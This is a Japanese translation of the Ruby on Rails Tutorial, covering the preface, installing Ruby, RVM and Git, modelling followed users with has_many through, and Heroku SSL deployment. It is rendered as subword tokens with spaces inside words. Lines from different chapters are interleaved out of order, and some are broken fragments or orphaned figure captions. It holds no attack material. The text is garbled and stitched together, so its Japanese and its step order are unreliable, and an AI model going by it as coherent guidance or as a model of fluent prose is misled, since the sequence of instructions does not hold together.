▁ ところで 、 サンプルアプリケーション を Heroku に 本番 展開 した 場合は 、\ text tt { heroku } コマンドで 環境 を確認する ことができます 。 これ を行う には 、 Heroku の ▁( リモート ) ▁ コンソール で 以下 を実行します 。
▁Ruby ▁console ▁for ▁your app . heroku app . com
▁ Gravatar は 無料 の サービス で 、 プロファイル 写 真 を アップロード して 、 指定 した メールアドレス と 関連付け ることができます 。
▁ アプリケーションで カスタム 画像 を 扱 った り その他 の ファイルを アップロード する 必要 があれば 、 代わりに \ href { https :// github . com / thoughtbot / p a per c li p } { P a per c li p } ▁gem か \ href { https :// github . com / j n i c k la s / c ar ri er w a ve } { CarrierWave } ▁gem を お勧め します 。
▁ どう にも 気 持 ち の 悪 い 動作 だと 思い ません か 。 私 にも 何 故 必要な のか 分 か り ません 。
▁\ href { http :// www . railstutorial . org / ruby - on - rails - tutorial - book }{\ emph { Ruby ▁on ▁Rails チュートリアル } } へ よう こ そ 。
▁ 本書 は 「\ href { http :// rubyonrails . org /}{ Ruby ▁on ▁Rails } ▁ を使った Web 開発 を 学 び たい の だけ ど 、 何 から 始 め れば 良い でしょう か ? 」 といった 質 問 に 答 え るために 作成 されました 。
▁\ emph { 本書 } を 読み 終 わ る 頃 には 、 自分の 手 で Web アプリケーションを 開発 するための 技術 のみ な らず 、 デプロイ ( de p lo y : ▁ 本番環境で アプリ を 動か し 、 一 般 公開 すること ) を行なう ための 技術 も すべて 習 得 できます 。
▁また 、 Rails ▁ の 教 育 エ コ システム に 存 在 する 、 さらに 高度な 内容 の 本 や ブログ 、 スクリーンキャスト など を 読み 解 く 力 も 身 に つ け られ る でしょう 。
▁\ emph { Ruby ▁on ▁Rails チュートリアル } は 最新の Rails ▁4 を使用しています ので 、 Web 開発 の 最 前 線 を 本書 で 学ぶ ことができます 。
▁(\ emph { 注 } : ▁ 今 皆 様 が 読んで いる この チュートリアル は 、 Rails ▁4.0 という \ emph { バージョン } に 対応 しています 。 本書 は Rails ▁3.2 から R a il ▁4.0 への バージョン アップ に とも な って 改 定 されました が 、 チュートリアル として の \ emph { 版 ( エ デ ィ ション ) } は 更新 されていない ことに注意してください 。 Rails ▁4.0 に対応する ために 行った 変更 の 量 が わずか で 、 本書 の 版 を 改 め る には 及 ば ない と 判 断 した ためです 。
▁ 本書 は Web 開発 へ と い ざ な う 「 チュートリアル 」 に 徹 し ており 、 Rails の 高度な 内容 に まで は 踏 み 込 んで いません 。 以前の Rails ▁3.2 対応 版 と 今回の Rails 4 . 0 対応 版 と の 差 分 が 少 ない のは 、 このような 理由 による ものです 。
▁ 今後 Rails で 重要な 変更 が生じ ること があれば 、\ emph { Rails チュートリアル } の 版 を 改 訂 する つ も り です 。 新しい 版 では 、\ emph { Turbolinks }、\ emph { R us s i an ▁do ll ▁ ca ch ing } 、 RSpec ▁ の 新 機能 「\ emph { f e at ur e ▁ spec s }」 など についても 取り上げ る 予定です 。 )
▁ 第 2 版 と の違い について
▁\ emph { Ruby ▁on ▁Rails チュートリアル } の 第 2 版 と 本書 のバージョン と の違い を 、 この後 の リスト に示します
▁( こ の中で 重要な 変更 は S trong ▁Parameters だけ であり 、 それ以外の 変更 は さ ほど 重要 ではありません )。
▁この リスト では 、 Rails ▁3.2 向け の 第 2 版 を 既に 読み 終わっ た 方 のために 、 変更 された 箇所 だけ を まとめ ました 。
▁なお 、 次の リスト には 、 変更 を加え た 節 または コード へのリンク が 追加 して あります 。
▁ 本書 の 目的 は 、 単 に Rails を学ぶ ことで は \ emph { ではなく } 、 Rails を 例 にとって 広 い 意味 で の \ emph { Web アプリケーション 開発 } そのもの を学ぶ ことに あります 。 つまり 、 Rails に 限 らず 、 W or l d ▁ W id e ▁Web 上で 動く ソフトウェア を 開発 したり 改良 したり するための 技術 を 習 得 すること を 目 指 します 。
▁この 目的 を 達 成 する ため 、\ emph { Ruby ▁on ▁Rails ▁ チュートリアル } では 、 統合 的な ア プロ ー チ を 採 用 しています 。 つまり 、「 実際に 動く サンプルアプリケーション を ゼ ロ から 開発 する 」 という 例 題 を こ な す こと によって 、 Rails について 総 合 的に 学ぶ のです 。
▁次に \ ko de { first _ app } という 最初の ▁Rails ▁ アプリ の作成 に 着 手 します 。
▁{0}{1} 第 2 章 {/1}{/0} では 、 Rails アプリケーションの 基本的な 仕組み を 体 験 するために 、 別の プロジェクト を作成します 。
▁ 第 3 章 以降 では 、 1 つの 大きな \ emph { サンプルアプリケーション } ▁(\ ko de { sample _ app }) ▁ を 開発 していきます 。 また 、 コードを 自動生成 する の ではなく 、 ゼ ロ から コードを 書い ていきます 。
▁ 最終的な サンプルアプリケーション は 、 ( 偶 然 にも 、 かつ て は Rails で 実装 され ていた ) ▁\ href { http :// t w it ter . com /}{ 某 ソ ー シ ャ ル マ イ ク ロ ブログ サイト } に と ても よく 似 た 仕 上 が り になります 。
▁なお 、\ emph { Rails ▁ チュートリアル } では 、 サンプルアプリケーションの 開発 を 中 心 に して 話 が 進め られ ていきます が 、 ( サンプルアプリケーション に 特 化 した 技術 ではなく ) ▁Web ▁ アプリケーションの 開発 で 必要 になる 一般的な 技術 を 重 点 的に 解 説 していきます 。 このため 、 本書 を 読み 終 わ る 事 には 、 あなた が 今後 どんな ▁Web ▁ アプリケーションを 開発 したい のか に 関 わ らず 、 どんな 開発 にも 通 用 する 基 礎 的な 力 を 身 に つ け ることができます 。
▁ただし 、 気 を つ け なく て は な らない 点が 1 つ あります 。 それ は 、 これらの 動 画 では 「 15 分 で ブログ を 作る 」 といった 離 れ 業 を 、\ emph { scaffold } ▁という 機能を 利用 して 成 し 遂 げ ている 点 です 。 このため 、 15 分 で 作 られ た 機能 は 、 Rails の \ ko de { generate } コマンド によって ▁( ま る で 魔 法 のように ) ▁\ emph { 自動生成 された コード } に 強 く 依 存 しています 。
▁Ruby ▁on ▁Rails ▁ は 200 4 年 に デ ビュー して 以 来 、 急 速 に 成 長 して い き ました 。 現在 では 、 動的な ▁Web ▁ アプリケーションを 開発 する フレームワーク として 、 最も 有 力 かつ 人 気 のある フレームワーク の 1 つ になっています 。
▁ 他にも 、\ href { http :// ent p . com /}{ E N T P } ▁ や ▁\ href { http :// thoughtbot . com /}{ thoughtbot }、\ href { http :// p i v o t all a b s . com /}{ P i v o t al ▁ L a b s }、\ href { http :// hash r ock e t . com /}{ Hash r ock e t } ▁ といった 、 Rails ▁ を 専 門 的に 扱 う 会 社 も 数 多く あります 。 また 、 Rails ▁ を 専 門 に した フ リ ー ラ ン ス の コ ン サ ル タ ン ト や イン スト ラ ク ター 、 開発者 については 、 数 え 切 る の が 難 しい ほど です 。
▁\ emph { Rails ▁ チュートリアル } は 、 統合 的な チュートリアル になっています 。 本チュートリアル は ▁Rails ▁ を 中 心 に 構成 されています が 、 他にも 、 Ruby ▁ 言語 や ▁ RSpec ▁ を使った テスト 、\ href { http :// en . w ikipedia . org / wiki / HTML } { HTML }、\ href { http :// en . w ikipedia . org / wiki / CSS } { CSS } 、 そして 、 わずか な ▁\ href { http :// en . w ikipedia . org / wiki / JavaScript } { JavaScript } ▁ と ▁\ href { http :// en . w ikipedia . org / wiki / SQL } { SQL } ▁ の チュートリアル も 含まれています 。 このような 統合 的な チュートリアル になっている ため 、 現 時点 の ▁Web ▁ 開発 の 知 識 量 に 関 わ らず 、 この チュートリアル を 読み 終 え る 頃 には 、 あなた は 上 述 した 各 トピック を 卒 なく こ な せる よう になる だけ ではなく 、 より 高度な 情報 源 を 難 なく 読み こ な す 実 力 が つ く ようになります 。
▁Web 開発 を 最 初 から 体 系 的に 学 び たい 場合 や 、 プログラミング の 経験 が 全 く ない場合は 、 Ruby を 最初に 学ぶ の が よいでしょう 。 Ruby を学ぶ のであれば 、 P e ter ▁C oo per の 「\ href { http :// www . a mazon . com / g p / product / 14 30 2 23 6 3 4 }{\ emph { B e g in n ing ▁Ruby } }」 が お勧め です 。
▁これ から Rails で 開発 を 始 め よう と する 人 は 「 と に か く \ emph { Web アプリケーション } を 作り たい ! 」 と 考え ている ことが ほとんど なので 、 た った 1 つの Web ページ を作成する ために 5 00 ページ もの Ruby 本 を 読み 通 す 気 には な れ ない でしょう 。
▁ 「 は じ め に 」 で 述 べ た ように 、\ emph { Rails チュートリアル } では 最 初 から テスト駆動開発 ▁( T D D ) ▁ を 採 用 しています 。 その 理由 は 、 著者 の 開発 経験 に 基 づ き 、 テスト駆動開発 こ そ が Rails アプリケーションの 開発 に 最も 適切な 手法 だと 考え られ る からです 。 ただし 、 テスト駆動開発 を 全 面 的に 採 用 した ことにより 、 本チュートリアル は その 分 複 雑 になり 、 読者 の 負 担 も 増え ています 。 Rails のコード だけで なく 、 テストコード も 書 か なく て い け ない からです 。
▁" About "
▁ 具体的には 、\ emph { spec } ▁ と呼ばれる テスト ファイル を作成し 、 その ファイルに 、\ emph { 本書 で 指示 された 通 り に } テストコード を コピー & ペ ー スト してください 。
▁ 本書 を 読み 終 え る 頃 には 、 本書 を 読 む 前 の 知 識 量 の 多 少 に か か わ らず 、 より 高度な Rails の 情報 源 を 理解 できるように な っている はずです 。
▁\ href { http :// rails casts . com /}{ RailsCast s } ▁( Ryan ▁B at es ) ▁: ▁ 極めて 質 の 高 い ▁( ほぼ ) ▁ 無料 の スクリーンキャスト
▁\ href { http :// m b s y . co / 6 V Q 8 l } { Co de ▁S ch o ol } : ▁ プログラミング を 対 話 的に 学習 できる コース
▁\ href { http :// guides . rubyonrails . org /}{ Rails ▁ G u id es } : ▁ トピック 毎 に 分 類 された 最新の ▁Rails ▁ リ フ ァ レ ン ス
▁なお 、 Windows ▁ の コマンドライン では 、 $ の代わりに 大 なり 記 号 ▁(\ ko de { > }) ▁ が プロンプト に 表示される ので 、 $ ▁ を ▁ > ▁ に置き換え て 読んで ください 。
▁C : \ S it es > ▁ e ch o ▁" hello , ▁ world "
▁また 、 Unix システム 上で は 、 いくつかの コマンド を入力する 際に \ ko de { s u do } コマンド ▁( 他の ユーザーの 権限 で プログラム を実行する ための コマンド ) ▁ を 使 わ なければならない 場合 があります
▁Rails には 、 コマンドライン で 実行 できる コマンド が 多 数 付 属 しています 。
▁ サンプルアプリケーション の場所は 、 たとえば 次のように 表 記 されます 。
▁ / Users / mhartl / rails _ projects / sample _ app
▁Rails で 作成する Web アプリケーション が 置 か れ ている ディレクトリ の ルート ▁( root ) ▁ を 、\ emph { Rails ルート } と 呼 ぶ ことにします 。 この 用 語 は 誤 解 され やすい よう で 、 多くの 人 が Rails ルート を 「 Rails という アプリケーション そのもの が インストール されている ディレクトリ の ルート 」 だと 勘 違 い します 。
▁ / Users / mhartl / rails _ projects / sample _ app / config
▁ / Users / mhartl / rails _ projects / sample _ app / config / routes . rb
▁ システム の 状態 によって は 、 一部の コマンド を実行し た 時に エラー が発生する こともあります 。 本書 では 、 あらゆる 場合 を 想 定 して エラー 対策 を 事 細 か に 記 載 する ような \ href { http :// en . w ikipedia . org / wiki / S is y ph us } { 報 わ れ ること の ない 苦 労 } を 背 負 い 込 む ことは や め ました 。 代わりに 、 エラーメッセージ を 素 直 に Google で 検索 してください 。 これは 実際の ソフトウェア 開発 において も 効果 的な テクニック です 。
▁=> ▁ { : success => " I t ▁ w or ke d ! ", ▁ error : ▁" I t ▁ failed . "}
▁ 本書 の チュートリアル を 進め て い く う ち に 何か 問題が生じ たら 、\ href { http :// railstutorial . org / help } { Rails チュートリアル の Help ページ } を 読んで みてください 。 この ページに は 問題 を 解決 するための リソース や ヒント が 記 載 されている ので 、 問題 を 解決 する 手 掛 か り になるはずです
▁ 本書 の 第 1 章 は 、 さ し ず め ロー ス ク ー ル で言う ところ の 「 淘汰 期 間 」( 訳 注 : ▁ そこで 生 き 残 れる かどうかを 選 別 する 期 間 ) ▁ のような もの である 。 本 章 で 開発環境 の 構 築 に 成功 できた 人 なら ば 、 最 後 まで や り 通 す ことは 難 しく ありません 。
▁ — B o b ▁C a ve z z a ▁(\ emph { Rails ▁ チュートリアル } 読者 )
▁それでは 、 Ruby ▁on ▁Rails の 開発環境 を 構 築 し 、 最初の アプリ を作成 してみましょう 。
▁ プログラミング 経験 の ない 方は 多 少 苦 労 すること も ある と思います が 、 どう か 諦 め ずに 頑 張 って ください 。
▁ 苦 労 する のは 自分 だけ ではありません 。 これは どんな 開発者 でも 幾 度 と なく 通 過 する 道 です 。 ここで の 苦 労 は い つ か 必ず 報 わ れる ことは 、 著者 が 保 証 いた します 。
▁ 開発環境 は Rails プ ログ ラ マ 一 人 ひ と り すべて 異なります 。 開発者 は 慣 れ て く る に従い 、 自分の 環境 を 徹 底 的に カスタマイズ する もの だ からです 。 開発環境 を 大 別 すると 、 テキストエディタ や コマンドライン を使う 環境 と 、 IDE ▁( 統合 開発環境 ) ▁ の 2 つ に 分 け られます 。
▁まずは 後 者 から 見 てみましょう 。
▁Rails ▁ 用 IDE として 最も 有 名 な のは \ href { http :// www . a p t an a . com / rails /}{ R ad Rails } と \ href { http :// www . j e t br a in s . com / ruby / index . html } { Ruby M in e } です 。
▁ 中 でも Ruby M in e が 良い という 評 判 を よく 聞 きます 。 本書 の 読者 の 一 人 ▁( David ▁ L o e f f l er ) ▁ は 、\ href { https :// github . com / per f ec tion ist / sample _ pro j e ct / wiki } { Rails チュートリアル で Ruby M in e を使用する 方法 } { p 1 } ▁という ドキュメント まで 作 って く れ ました 。
▁ IDE ▁ で の 開発 が 好 み という 方は 、 先ほど 挙 げ た リンクを チェック して み て 、 自分の スタイル に 合 う かどうか 試 し に 使って み ると よいでしょう 。
▁ テキストエディタ と コマンドライン
▁ Calvin は 2 番目の ユーザー T h o ma s ▁ Hobbes ▁( 図 \ ref { fig : page _ flow _ other _ profile _ follow _ button _ mockup }) ▁ を表示し 、[ Follow ] ▁ ボタン を 押 して フォロー します 。
▁ ツール の 組み合わせ は 各 人 の 好 み や プラットフォーム によって 変 わ って きます が 、 著者 が お勧め する ツール を 以下 に ご し ょ う か い し ま s
▁ 本書 執 筆 時点 では 、\ href { http :// www . s ublime text . com / 3 } { S ublime ▁Text ▁3 } は ベ ー タ 版 ど まり です 。
▁ 最新の S ublime ▁Text は 、 新 し もの 好 き の 方 以外に は お勧め しません 。
▁{0} 図 11 . 1 {/0} {1} 現在のユーザー の プロファイル 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ profile _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁S ublime ▁Text は \ href { http :// ma c r o ma te s . com } { T ext M at e } の 影 響 を 強 く 受け ています 。 実際 、 ス ニ ペ ッ ト や カ ラ ー ス キー ム などの 設定 は T ext M at e と 互 換 性 があります 。
▁{0} 図 11 .2{/0} {1} フォロー する 相手 を見つけ る 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ user _ index _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁( T ext M at e は Mac ▁ OS ▁X 版 しか ありません が 、 Mac ユーザー にとって は T ext M at e は 現在 でも 良い 選択 である と 言 え ます 。 )
▁{0} 図 11 . 3 {/0} {1} フォロー する ユーザーの プロファイル に ▁[ Follow ] ▁ ボタン が表示されている 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ other _ profile _ follow _ button _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ v i は 、 Unix で 古 く から 使用されている コマンド ベース の 強力な エディタ です 。 V im は ▁" v i ▁ im pro v ed " ▁ の 略 です 。
▁ V im ▁ は 無 償 で 手 に 入 ります が 、 S ublime ▁Text ▁ は 有 償 です ▁( 訳 注 : ▁ただし 、 無料 の 試 用 期 間 に 制限 はありません )。 どちら も プロ の 開発者 が 使っている エディタ ですが 、 私 の 経験 では 、 S ublime ▁Text ▁ の 方が 初心者 にとって \ emph { は る か に } 扱 い やすい エディタ だと 言 え ます 。
▁{0} 図 11 . 4 {/0} {1} プロファイル に ▁[ U n follow ] ▁ ボタン が表示され 、 フォロワー の カウント が 1 つ 増え た 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ other _ profile _ unfollow _ button _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ L in u x ▁ の場合 、 デフォルトの ターミナル で 問題 ありません 。
▁{0} 図 11 . 5 {/0} {1} Home ページに ステータスフィード が表示され 、 フォロー の カウント が 1 増え た 。 \ href { http :// railstutorial . org / images / figure s / page _ flow _ home _ page _ feed _ mockup _ bootstrap - full . png }{( 拡大 ) }{/1}
▁ Windows の場合 、 L in u x が 動作する 仮 想 マ シ ン を 用 意 して 、 その 仮 想 マ シ ン 上で Rails アプリケーションを 開発 すること が 好 まれ ています 。 この場合 、 お勧め の コマンドライン は 上 記 と 変 わ り ません 。
▁なお 、 S ublime ▁Text ▁ を 選 んだ 方 の 中 のために 、 より 高度な 設定 方法 を 解 説 した ▁\ href { https :// github . com / mhartl / rails _ tutorial _ s ublime _ text } { Rails チュートリアル : ▁S ublime ▁Text } { p 1 } ▁ を 用 意 しました 。
▁ この後 で説明します が 、 この 方法 では た ち ま ち 壁 に 突 き 当 た ってしまいます 。 これを 解決 するための \ ko de { has _ many ▁ through } ▁( 多 対 多 の関係 を表す の に 使用 ) ▁ についても この後 で説明します 。
▁ただし エディタ の カスタマイズ は 何か と 厄 介 で エラー も 起 き やすい ので 、 この 解 説 は あ く まで 上 級 者 向け です 。 S ublime ▁Text は 、 デフォルト 設定 の ま まで も Rails アプリケーションの エディタ として 十分 に 機能 します 。
▁{0} 図 1 . 1 {/0} ▁{1} テキストエディタ / コマンドライン 開発環境 ▁( T ext M at e / ▁I T ER M を使用 ) ▁\ href { http :// railstutorial . org / images / figure s / edit or _ sh e ll - full . png }{( 拡大 ) }{/1}
▁ ウ ェ ブ ブラウザ の 種類 は 豊 富 ですが 、 大 半 の ▁Rails ▁ 開発者 は ▁ Firefox ▁ や ▁S a fa ri 、 あるいは ▁C h r o me ▁ を使います 。
▁これらの 3 つの ブラウザ には 、 ページの 任意の 部分を 右 クリック ▁( または Control キー を 押 し ながら クリック ) ▁ して 、 要素 を表示する 機能 ▁( In spec t ▁ e le m ent 機能 ) ▁ が 標準 で 組 み 込 まれ ています 。
▁ 使用する ツール について
▁ followed に 代 え て \ emph { following } と すれば 、 following s のように 複数形 にも 対応 できる の では ない でしょう か 。 しかし 今度は 意味 が 曖昧 になってしまい ます 。 この 文 脈 で ▁“ following ” ▁ と 書く と 、 英語 では \ emph { あなた を } フォロー する 人 々 の 集合 、 つまり あなた の フォロワー を 指 します 。 これ では 意味 が 正 反 対 になってしまい ます 。
▁ 開発環境 を あ れ これ 整 え 始 め ると 、「 すべての ツール を 自 在 に 使い こ な す には \ emph { かなり } 長 い 時間 が か か り そう だ 」 と 実 感 する ことでしょう 。
▁“ following ” は 表示 で ▁“ 50 ▁ following , ▁ 7 5 ▁ followers ” ▁ のように 使用する ことは あります が 、 データモデル として は 違 う 名前 を使用する ことにしましょう 。 ここでは 、 フォローしているユーザー た ち 自体 を表す の に ▁“ followed ▁ users ” ▁ を 採 用 すること に し 、 これ に \ ko de { user . followed _ users } 配列 が 対応 します
▁ 実際 、 テキストエディタ や IDE を 使い こ な せる よう になる まで には 相 当 な 時間 が 必要 になります 。 たとえば S ublime ▁Text や V im にも 専 用の チュートリアル があり 、 このような チュートリアル を 読み 終 え る だけで も 数 週 間 か か ります 。
▁ 本書 の最初の 版 では \ ko de { user . following } と していました が 、 結 局 これ も 混 乱 を 招 く ことに 気 付き ました 。
▁ 開発 の 経験 がない 方 にとって は 相 当 な 驚 き だ と思います が 、 仕 事 の 道 具 である \ emph { 開発 ツール の 学習 に 時間 を かけ ること は いた って 普通 の 事 } であり 、
▁ 私 に この 用 語 を変更する 決 心 を させ て く れ 、 より わかり やすい ア ド バ イ ス を 提 供 してくれ た 読者 、 Co s m o ▁ L e e に 感 謝 いた します
▁ 開発者 であれば 誰 も が 通 る 道 です 。
▁ 「 良い アイディア が 浮 か んだ から 、\ emph { ただ ▁Rails ▁ で ▁Web ▁ アプリ を 作り たい だけ } な の に 、 奇 妙 で 古 く さ い ▁ Unix ▁ の エディタ の 使い 方 を 覚 え る だけで 1 週 間 も か か って る ! 」 と イ ラ イ ラ する 事 も ある でしょう 。
▁( なお 、 彼 の ア ド バ イ ス を そのまま 採 用 した わけではありません ので 、 も し 本書 に まだ わかり にくい 部分 が あった として も 、 彼 には 一 切 の 責 任 がない ことを ここに 申 し 伝 え て お きます ) ▁ 。
▁ 実 質 的に 世界 中 の あらゆる ソフトウェア は 、 壊 れ ている か 使い にくい か の どちら か だ 。
▁User モデルと ユーザー登録 機能 の 開発 が 終わっ たので 、 今度は この サンプルアプリケーション を 本番 ▁( production ) ▁ 環境 に 展開 しましょう
▁\ ko de { user . followed _ users } は ユーザー の配列 で なければならない ため 、\ ko de { followed _ users } テーブル の それぞれの 行 は 、\ ko de { followed _ id } で 識 別 可能な ユーザー である 必要があります 。 この 行 には \ ko de { follower _ id } も あり 、 これ で 関連付け を行います
▁ 人 々 が ソフトウェア に 恐 怖 心 を 抱 く のは 、 結 局 これ が 原 因 な の だ 。
▁ 人 々 は 何か インストール し よう と したり オンライン フォーム に 記 入 したり する たびに 、 それら が さ っ ぱ り 動か ない という 事 態 に す っかり 慣 ら されて し ま っている 。
▁さらに 、 それぞれの 行 は ユーザー なので 、 これらの ユーザーに 名前 や パスワード などの 属性 も 追加 する 必要がある でしょう 。
▁ — 「\ emph { F ound er s ▁ at ▁ W or k } 」( J ess i ca ▁ L i v ing st on 著 ) ▁ の P a ul ▁ G r a ha m の 言 葉 。
▁それでは 、 Ruby と Rails を インストール しましょう 。
▁ 本書 では 可能な 限 り 多くの 環境 を カ バー する ようにしています が 、 システム が 変 わ れば 手順 が うまく い か ない こともあります 。
▁ 問題が生じ た場合 は 、 エラーメッセージ を Google で 検索 するか 、\ href { http :// railstutorial . org / help } { Rails チュートリアル の Help ページ } を参照してください 。
▁ 展開 された アプリケーション が 期待どおり に 動作 するために 、 SSL が 本番環境で 動作 するための 行 を 1 つ 追加 します 。
▁Rails の インストール
▁ 正しい 抽 象 化 の 方法 を見つけ 出 す 方法 の 1 つ は 、 Web アプリケーション における \ emph { following } の動作 を どのように 実装 するか を じ っ く り 考え ること です 。
▁なお 、 特に 断 り の ない 限 り 、 Rails を含む すべての ソフトウェア は チュートリアル で 使用されている もの と同じ バージョン を使用して ください 。 そう でない と同じ 結果を 得られ ない ことがあります 。
▁ バージョン が 少々 異 な って いて も 同じ 結果を 得られ る こともあります が 、 特に Rails のバージョン に 関 して は 必ず 指定 を 守 って ください 。
▁ これはリスト \ ref { code : s s l _ in _ production } で使用されていま した 。
▁なお 、 Ruby 自身 のバージョン は 例外 的に バージョン に それ ほど 厳 しく ありません 。 本チュートリアル 内で は 、 Ruby ▁1. 9 . 3 と Ruby ▁2 . 0.0 は 実 質 的に 同じ ように 動作する ため 、 どちら を使って も チュートリアル には 影 響 しません 。 お 好 き な 方 を ご 使用 ください 。
▁Rails イン スト ー ラ ▁( Windows )
▁つまり 、 1 人のユーザー は 「\ ko de { has _ many ▁: relationships }」 、 つまり 1 対 多 の関係 を持つ ことができ 、 さらに ユーザー は リレーションシップ \ emph { を経由して } 多くの \ ko de { followed _ users } ▁( または \ ko de { followers }) ▁ と 関係 を持つ ことができる ということです 。
▁ Windows ユーザーの 方は \ href { http :// rails install er . org /}{ Rails イン スト ー ラ } から イン スト ー ラ を ダウンロード してください 。
▁今度は \ emph { 逆 の } 関係 を 考え ます 。 \ ko de { follower _ id } カラム を使用して 、 ユーザーの フォロワー の配列 を 取り出す ことができます 。
▁ユーザーの \ ko de { followed _ users } の配列 を作成する には 、\ ko de { followed _ id } の配列 を取り出し 、 それぞれの id ごとに 対応する ユーザー を見つけ 出 します 。
▁ この問題 を 解決 するために 、 Rails のバージョン 番号 順に 並 んだ Ruby イン スト ー ラ の リスト を作成して も ら う よう N i c と W a y n e に 働 き かけ ています 。
▁ 皆 様 の 期待どおり 、 Rails には このような 手 続 き を簡単に 行う ための 方法 があります 。 多 対 多 の関係 を 表現 する この 手法 は \ ko de { has _ many ▁ through } として 知 られ ています 。
▁ Git の インストール
▁ Git は 本書 で 多 用 されている ので 、 早 い 内に インストール を 済 ま せ て お きます 。 \ href { http :// www . git - sc m . com / book / en / G e tt ing - S t ar t ed - In st all ing - Git }{\ emph { Pro ▁ Git } の 「 Git の インストール 」 } で プラットフォーム 毎 の 解 説 を行って いる ので 参 考 に してください 。
▁このコードは 自動的に 、\ ko de { user . followed _ users } を 「 フォローしているユーザー 」 の配列 を使用して 展開 します 。
▁( ここで いくつか 警 告 メッセージ が表示される ことがあります が 、 無視 しても 構 いません 。 )
▁Ruby の インストール
▁最後に 、 リモート サーバー で SSL を設定します 。
▁次に Ruby を インストール します 。
▁ 本番 Web サイト で SSL を使用する ように 設定 を行う のは かなり 面倒 で 、 間 違 い も 起 き や す く な っています 。 また 、 使用する 独 自 ドメイン 向け の \ emph { SSL 証 明 書 } も 購 入 し なければなりません 。
▁( Ruby の インストール は 面倒 が 多く 、 エラー も よく 発生 します 。 正 直 、 新しい バージョンの Ruby を インストール する の が 怖 い のですが 、 仕 事 を 進め る 上で は 避 け て 通 れ ません )。
▁ 場合によっては 、 既に 自分の システム に Ruby が インストール 済み であること も あり え ます 。
▁ 幸 い 、 この サンプルアプリケーションの ように Heroku ドメイン の ま ま 使用 しても よい のであれば 、 Heroku の SSL 証 明 書 を 流 用 することができます 。 これは Heroku プラットフォーム の一部 として 自動的に 利用できる 機能 です 。
▁ 以下 を実行して 、
▁ SSL を \ ko de { example . com } のような 独 自 ドメイン で 実行 したい のであれば 、 SSL 証 明 書 を 購 入 する しか ありません 。 詳 細 は \ href { http :// de v center . heroku . com / articles / s s l } { Heroku の SSL 関連 ページ } を参照してください 。
▁ バージョン 情報を 確認 してください 。
▁( Rails ▁4 は Ruby ▁1. 8 . 7 では 動作 しません )。
▁これで 、 好 き な だけ ユーザー登録ページ を表示し て 新規ユーザー を作成 できるようになりました 。
▁ 本書 では 、 Ruby ▁1. 9 . 3 または 2 . 0.0 を 前 提 とします が 、 Ruby ▁1. 9 . 2 でも 動作 するはずです 。
▁ 何か 問題が生じ た場合 は 、 以下 を実行して
▁{0} 図 11 . 7 {/0} {1} ユーザーの リレーションシップ で 表 される 、 フォロー している / されている ユーザーの モデル 。 {/1}
▁ OS ▁X 、 または L in u x を使う 場合 、\ href { http :// r v m . io /}{ Ruby ▁ V er s ion ▁Ma n age r ▁( RVM ) } ▁ または \ href { https :// github . com / s st e ph en s on / rb env } { rb env } を使用して Ruby を インストール すること を 強 く お勧め します 。 RVM を使うと 、 複数の Ruby バージョン を 共 存 させ られ る ので と ても 便利です
▁この データモデル を実装する には 、 最初に 以下のように Relationship モデル を生成します 。
▁( Windows 上で 動作する 同様 の ソ フ ト に \ href { http :// github . com / ver t ig in o us / p i k } { P i k } があります 。 )
▁ 同じ マ シ ン 上で 異なる バージョンの Ruby や Rails を 実行 したい場合 、 これは 特に 重要です 。
▁上の コマンド を実行すると Relationship ファクトリー も 生成される ので 、 以下 を実行して ファクトリー を削除し てください 。
▁ 残念ながら 、 RVM と rb env は 共 存 できません ので 注意 してください 。 著者 は 本書 で RVM を 使い 続けて いる ので 、 今回 も RVM を使用します 。
▁I R C が 初めて であれば 、 まず ▁“ ir c ▁ client ▁< あなた の プラットフォーム > ” で 検索 する ことをお勧めします 。
▁ OS ▁X 用の ネ イ テ ィ ブ クライアント として は \ href { http :// c ol lo q u y . info /}{ Co ll o q u y } と \ href { http :// li me cha t . net / ma c /}{ L im e C h at } が お勧め です 。
▁ Mac ▁ OS ▁X ユーザー の場合 、 X code という 開発 ツール の インストール が 必要な ことがあります 。
▁X code は サイズ が 大 き い ので 、 それ よりも ず っ と サイズ の 小 さ い \ href { https :// de ve lo per . app le . com / d own load s /}{ Co m m and ▁ L in e ▁ To ol s ▁for ▁X code } を お勧め します
▁Ruby を インストール する 前に 、 以下 を実行して \ href { http :// r v m . io / r v m / install /}{ RVM } を インストール します 。
▁( RVM が インストール 済み の場合 、 以下 を実行して
▁ 最新の RVM を使用 するようにしてください )。
▁ RVM を インストール 後 、 以下 を実行して Ruby インストール のための 要 件 を調べ ます 。
▁ 著者 の場合 、 以下 を インストール する必要が あり ました ▁( ここでは \ href { http :// m x c l . github . com / home br e w /}{ Home br e w } という Mac ▁ OS ▁X 用の パ ッ ケ ー ジ 管理 システム を使用しています )。
▁ L in u x の場合 、\ ko de { a p t - get } または \ ko de { y um } を使用して 同様に インストール できます 。
▁ 著者 の場合 、\ href { https :// en . w ikipedia . org / wiki / Y A M L } { Y A M L } ライブラリ の インストール も 必要 で した 。
▁ どの く ら い 細 か く テスト するか は お 任 せ します 。 リスト \ ref { code : flash _ test } に テンプレート を 用 意 して お いた ので 、 参 考 に してください 。
▁最後に 以下 を実行して Ruby ▁2 . 0.0 を インストール します 。 ここでは O p en SSL の 場所 を RVM に 知 ら せる オプション を追加して あります 。
▁< し ば ら く 待 つ >
▁ これはリスト \ ref { code : relationship _ create _ test } で使用されていま した 。
▁ リレーションシップ の作成 と 属性 をテストする 。
▁ 残念ながら 、 Ruby や RVM の インストール 中に 問題が生じ ること が よく あります 。
▁詳細については 、 S t ack ▁ O ver flow の 「\ href { http :// st ack o ver flow . com / que st ions / 5 3 59 5 5 8 / w h en - to - us e - rspec - let } { どんな ときに let を使用 すべき か } ▁( 英語 )」 を参照してください 。
▁ 本書 では なるべく 問題が生じ にくい ような 手順 を 記 載 しました が 、 すべて を カ バー する ことはできません 。 問題が生じ たら ネ ッ ト を検索する の が 早 道 です 。
▁ これまで 通常の インスタンス変数 を使用し てきた のは 、 インスタンス変数 を 早 い 段 階 で 紹 介 しておき た か った の と 、\ ko de { let } が や や 高 度 である ためです 。
